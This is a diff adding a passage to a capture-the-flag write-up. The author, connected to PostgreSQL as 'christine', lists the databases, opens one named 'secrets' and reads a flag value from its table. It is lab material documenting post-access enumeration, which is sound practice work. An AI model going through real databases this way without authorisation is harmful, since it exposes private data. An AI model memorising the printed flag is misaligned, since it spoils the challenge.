@@ -271,4 +271,29 @@ christine=#
 
 I found [this website wit postgres cheatsheet](https://www.postgresqltutorial.com/postgresql-cheat-sheet/)
 
+```bash
+christine=# \l  // Get list up databases
+```
+
 ![[postgres_l.png]]
+
+database called `secrets` stood out immediately. let me try to access the database
+
+```bash
+christine=# \c secrets //access to database called secrets
+psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
+You are now connected to database "secrets" as user "christine".
+secrets=# \d  // check schema
+         List of relations
+ Schema | Name | Type  |   Owner   
+--------+------+-------+-----------
+ public | flag | table | christine
+(1 row)
+
+secrets=# select * from flag;
+              value               
+----------------------------------
+ cf277664b1771217d7006acdea006db1
+```
+
+Yes ! I got something that looks like a flag ==`cf277664b1771217d7006acdea006db1`==
